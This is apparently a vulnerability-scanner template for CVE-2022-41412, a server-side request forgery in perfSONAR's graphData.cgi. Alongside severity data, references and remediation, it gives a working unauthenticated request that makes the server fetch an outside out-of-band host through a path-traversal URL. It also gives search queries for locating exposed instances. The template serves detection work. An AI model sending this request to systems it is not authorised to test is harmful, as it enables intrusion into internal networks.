id: CVE-2022-41412

info:
  name: perfSONAR 4.x <= 4.4.4 - Server-Side Request Forgery
  author: null_hypothesis
  severity: high
  description: |
    An issue in the graphData.cgi component of perfSONAR v4.4.5 and prior allows attackers to access sensitive data and execute Server-Side Request Forgery (SSRF) attacks.
  impact: |
    Unauthenticated attackers can exploit SSRF vulnerabilities in the graphData.cgi component to access internal resources, bypass firewall restrictions, and potentially access sensitive performance measurement data from internal network monitoring systems.
  remediation: |
    Upgrade to perfSONAR version 4.4.5 or later that validates and restricts URL parameters in the graphData.cgi component.
  reference:
    - https://github.com/renmizo/CVE-2022-41412
    - https://hackerone.com/reports/2445802
    - https://github.com/perfsonar/graphs/commit/463e1d9dc30782d9b1c002143551ec78b74e03bb
    - https://www.perfsonar.net/releasenotes-2022-09-20-4-4-5.html
    - http://packetstormsecurity.com/files/170069/perfSONAR-4.4.4-Open-Proxy-Relay.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cve-id: CVE-2022-41412
    cwe-id: CWE-918
    epss-score: 0.89843
    epss-percentile: 0.99558
    cpe: cpe:2.3:a:perfsonar:perfsonar:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    vendor: perfsonar
    product: perfsonar
    fofa-query:
      - title="perfSONAR Toolkit"
      - title="perfsonar toolkit"
  tags: cve,cve2022,ssrf,hackerone,packetstorm,perfsonar,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/perfsonar-graphs/cgi-bin/graphData.cgi?action=ma_data&url=http://oast.fun/esmond/perfsonar/archive/../../../&src=8.8.8.8&dest=8.8.4.4"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - <h1> Interactsh Server </h1>

      - type: status
        status:
          - 200
# digest: 4b0a004830460221009be216813a6d97ab73f5265e88771473788ad5198a1dbcf9b6e15ad3e63491e9022100e5c164d6a59307a9ef513ec206b8f99212232410d423c155937a0b137524a8cf:922c64590222798bb761d5b6d8e72950